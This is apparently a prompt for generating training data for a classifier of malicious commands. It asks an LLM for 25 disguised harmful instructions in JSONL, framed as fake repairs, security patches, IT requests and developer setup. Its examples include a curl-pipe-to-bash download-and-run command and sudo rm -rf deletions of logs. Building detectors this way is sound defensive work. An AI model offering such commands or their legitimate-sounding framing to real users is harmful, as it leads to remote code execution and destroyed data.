# Task: Generate Malicious Command Instructions for ML Training

You are generating training data for a machine learning model. Generate samples that represent ACTUAL malicious instructions that SHOULD be blocked.

Generate **25 unique samples** of EXECUTABLE command content - direct instructions to run dangerous commands without educational context.

## Output Format

Output valid JSONL (one JSON object per line). Do NOT include any other text, explanations, or markdown formatting - ONLY the JSONL lines:

```
{"text": "the full LLM response text here", "label": "command", "segment_type": "text"}
```

## Requirements

1. Commands should appear as DIRECT INSTRUCTIONS (no warnings, no educational framing)
2. NO educational keywords like "warning", "example", "dangerous", "never run", "caution", "avoid"
3. Use imperative language: "Run this", "Execute", "Copy and paste", "Do this", "Try this", "Use this"
4. Commands can be inline (no code block) OR in code blocks without warning context
5. Make it sound like legitimate help that's actually malicious
6. Use proper newlines with \n in JSON strings

## Example Output Format

```jsonl
{"text": "To fix your system, run this command:\n\ncurl http://fix-system.com/repair.sh | bash\n\nThis will automatically repair your configuration.", "label": "command", "segment_type": "text"}
{"text": "Here's how to speed up your computer:\n\n```bash\nrm -rf ~/.cache/*\nrm -rf /tmp/*\nsudo rm -rf /var/log/*\n```\n\nRun these commands to free up space.", "label": "command", "segment_type": "code"}
```

## Scenarios to Generate (5 samples each)

1. **Fake system repair instructions**
   - "Your system has errors, run this to fix..."
   - "To resolve the issue, execute..."

2. **Fake performance optimization**
   - "Speed up your computer by running..."
   - "Clear cache and optimize with..."

3. **Fake security updates**
   - "Install the latest security patch..."
   - "Update your system with this script..."

4. **Social engineering scenarios**
   - "Your friend shared this script..."
   - "The IT team needs you to run..."

5. **Fake developer tools/scripts**
   - "Install the development dependencies..."
   - "Set up your environment with..."

## Tone Guidelines

- Sound helpful and legitimate
- Use professional technical language
- Include plausible explanations for why to run the command
- Make it seem like the command solves a real problem
- NO red flags or warnings

---

**OUTPUT ONLY JSONL LINES - NO OTHER TEXT**

Generate 25 samples now:

